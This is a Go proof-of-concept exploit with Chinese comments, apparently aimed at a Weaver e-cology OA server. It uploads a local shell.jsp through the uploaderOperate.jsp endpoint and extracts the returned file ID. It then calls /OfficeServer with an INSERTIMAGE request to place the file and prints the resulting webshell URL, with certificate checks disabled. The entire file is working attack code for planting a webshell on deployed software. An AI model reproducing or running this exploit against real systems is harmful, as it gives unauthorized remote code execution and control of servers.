package poc

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"path/filepath"
	"regexp"
)

func GetFileId(url string) string {
	// 获取当前路径下的shell地址
	shellPath, _ := filepath.Abs("shell.jsp")
	shellFilename := filepath.Base(shellPath)

	// 创建一个带有文件和字段的multipart请求体
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// 添加字段
	writer.WriteField("secId", "1")
	writer.WriteField("plandetailid", "1")

	// 添加文件
	fileContents, _ := ioutil.ReadFile(shellPath)
	fileWriter, _ := writer.CreatePart(textproto.MIMEHeader{
		"Content-Disposition": []string{fmt.Sprintf(`form-data; name="Filedata"; filename="%s"`, shellFilename)},
	})
	fileWriter.Write(fileContents)

	// 结束请求体
	writer.Close()

	// 创建POST请求
	request, _ := http.NewRequest("POST", url+"/workrelate/plan/util/uploaderOperate.jsp", body)
	request.Header.Set("Content-Type", writer.FormDataContentType())

	// 创建HTTP客户端，忽略证书验证
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	response, err := client.Do(request)
	if err != nil {
		log.Println("请求发送失败:", err)
		return "error"
	}
	defer response.Body.Close()

	// 读取响应
	responseBody, _ := ioutil.ReadAll(response.Body)
	// 使用正则表达式提取filedid的值
	re := regexp.MustCompile(`fileid=(\d+)`)
	match := re.FindStringSubmatch(string(responseBody))

	if response.StatusCode == 200 && len(match) > 1 {
		fileid := match[1]
		log.Printf("filedid的值为：%s\n", fileid)
		return match[1]
	} else {
		log.Println("未找到filedid的值")
		return "error"
	}
}

func UploaderOperate(url string) {
	if GetFileId(url) == "error" {
		log.Println("[-] 不存在文件上传漏洞")
	} else {
		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)
		err := writer.WriteField("aaa", fmt.Sprintf("{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'%s'}", GetFileId(url)))
		if err != nil {
			fmt.Println(err)
			return
		}
		err = writer.Close()
		if err != nil {
			fmt.Println(err)
			return
		}
		request, err := http.NewRequest("POST", url+"/OfficeServer", body)
		if err != nil {
			fmt.Println(err)
			return
		}
		request.Header.Set("Content-Type", writer.FormDataContentType())

		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client := &http.Client{Transport: tr}

		response, err := client.Do(request)
		if err != nil {
			fmt.Println(err)
			return
		}
		defer response.Body.Close()
		// 获取rname
		rname := response.Header.Get("Rname")
		//fmt.Println("Rname:", rname)
		// 获取文件名称
		if rname != "" {
			re := regexp.MustCompile(`IMAGETYPE":"([^"]+)"`)
			match := re.FindStringSubmatch(rname)
			fielName := regexp.MustCompile("\\\\([^\\\\]+)$")
			Wbeshell := fielName.FindStringSubmatch(match[1])
			log.Println("[+] Webshell地址为：", url+"/"+Wbeshell[1])
		} else {
			log.Println("[-] 未获取到 Webshell 地址，请手动尝试")
		}
	}

}
